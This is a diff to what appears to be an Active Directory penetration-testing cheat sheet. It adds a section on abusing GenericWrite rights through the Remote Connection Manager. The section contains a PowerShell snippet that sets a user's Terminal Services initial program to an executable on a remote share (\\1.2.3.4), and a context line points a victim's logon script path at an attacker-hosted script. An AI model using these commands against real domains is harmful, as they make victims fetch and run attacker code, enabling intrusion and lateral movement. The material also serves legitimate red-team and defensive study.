@@ -48,6 +48,7 @@
     - [Abusing Active Directory ACLs/ACEs](#abusing-active-directory-aclsaces)
       - [GenericAll](#genericall)
       - [GenericWrite](#genericwrite)
+      	- [GenericWrite and Remote Connection Manager](#genericwrite-and-remote-connection-manager)
       - [WriteDACL](#writedacl)
     - [Trust relationship between domains](#trust-relationship-between-domains)
     - [Child Domain to Forest Compromise - SID Hijacking](#child-domain-to-forest-compromise---sid-hijacking)
@@ -1149,6 +1150,16 @@ Set-DomainObject <UserName> -Set @{serviceprincipalname='ops/whatever1'}
 
 * WriteProperty on an ObjectType, which in this particular case is Script-Path, allows the attacker to overwrite the logon script path of the delegate user, which means that the next time, when the user delegate logs on, their system will execute our malicious script : `Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1`
 
+##### GenericWrite and Remote Connection Manager
+
+In Windows Server 2012 R2 and earlier versions, when a user logs on to a server with the Terminal Server (TS)/Remote Desktop Session Host (RDSH) role installed, the Remote Connection Manager process contacts the domain controller to query the configurations that are specific to Remote Desktop for the user object in Active Directory. These settings are then applied during the user’s login process to customise their sessions. One of things that can be configured is a program used to replace the users graphical environment. - https://sensepost.com/blog/2020/ace-to-rce/
+
+```powershell
+$UserObject = ([ADSI]("LDAP://CN=User,OU=Users,DC=ad,DC=domain,DC=tld"))
+$UserObject.TerminalServicesInitialProgram = "\\1.2.3.4\share\file.exe"
+$UserObject.TerminalServicesWorkDirectory = "C:\"
+$UserObject.SetInfo()
+```
 
 #### WriteDACL
 
